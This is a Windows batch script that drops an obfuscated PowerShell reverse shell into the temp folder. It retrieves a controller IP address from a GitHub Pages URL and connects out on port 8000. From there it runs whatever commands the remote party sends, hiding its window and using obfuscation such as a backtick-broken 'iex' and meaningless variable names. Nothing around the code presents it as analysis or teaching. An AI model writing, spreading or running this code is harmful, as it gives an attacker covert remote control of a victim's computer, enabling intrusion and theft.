@echo off
powershell -NoP -W hidden ; exit
(
echo $KLK = New-Object System.Net.Sockets.TCPClient^($args[0],$args[1]^);
echo $PLP = $KLK.GetStream^(^);
echo [byte[]]$VVCCA = 0..^(^(2-shl^(3*5^)^)-1^)^|%%{0};
echo $VVCCA = ^([text.encoding]::UTF8^).GetBytes^("Succesfuly connected .`n`n"^)
echo $PLP.Write^($VVCCA,0,$VVCCA.Length^)
echo $VVCCA = ^([text.encoding]::UTF8^).GetBytes^(^(Get-Location^).Path + ' ^> '^)
echo $PLP.Write^($VVCCA,0,$VVCCA.Length^)
echo [byte[]]$VVCCA = 0..^(^(2-shl^(3*5^)^)-1^)^|%%{0};
echo while^(^($A = $PLP.Read^($VVCCA, 0, $VVCCA.Length^)^) -ne 0^){;$DD = ^(New-Object System.Text.UTF8Encoding^).GetString^($VVCCA,0, $A^);
echo $VZZS = ^(i`eX $DD 2^>^&1 ^| Out-String ^);
echo $HHHHHH  = $VZZS + ^(pwd^).Path + '! ';
echo $L = ^([text.encoding]::UTF8^).GetBytes^($HHHHHH^);
echo $PLP.Write^($L,0,$L.Length^);
echo $PLP.Flush^(^)};
echo $KLK.Close^(^)
)>%temp%\331.ps1

for /f %%i in ('curl -kLs stivengiv.github.io/revs/ip.txt') do (set "_ip=%%i")
powershell %temp%\331.ps1 %_ip% 8000
exit
